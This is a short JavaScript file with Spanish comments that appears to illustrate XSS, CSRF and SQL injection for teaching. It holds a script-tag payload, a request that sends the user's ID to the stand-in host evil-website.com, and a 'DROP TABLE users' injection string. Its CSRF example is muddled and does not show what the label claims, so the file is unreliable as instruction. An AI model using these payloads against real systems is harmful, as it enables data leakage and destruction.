// archivo.js

// Vulnerabilidad XSS (Cross-Site Scripting)
const userInput = "<script>alert('¡Hola, soy un ataque XSS!');</script>";
const sanitizedInput = sanitizeHTML(userInput);
document.getElementById("mensaje").innerHTML = sanitizedInput;

// Vulnerabilidad CSRF (Cross-Site Request Forgery)
const userId = getCurrentUserId(); // Obtener el ID del usuario actual
const maliciousURL = `https://evil-website.com/deleteUser?userId=${userId}`;
const deleteButton = document.getElementById("delete-button");
deleteButton.addEventListener("click", function() {
  sendDeleteRequest(maliciousURL);
});

// Vulnerabilidad SQL Injection
const username = "admin'; DROP TABLE users;--";
const password = "password123";
const sanitizedUsername = sanitizeSQL(username);
const sanitizedPassword = sanitizeSQL(password);
const sqlQuery = `SELECT * FROM users WHERE username='${sanitizedUsername}' AND password='${sanitizedPassword}'`;
executeSQLQuery(sqlQuery);
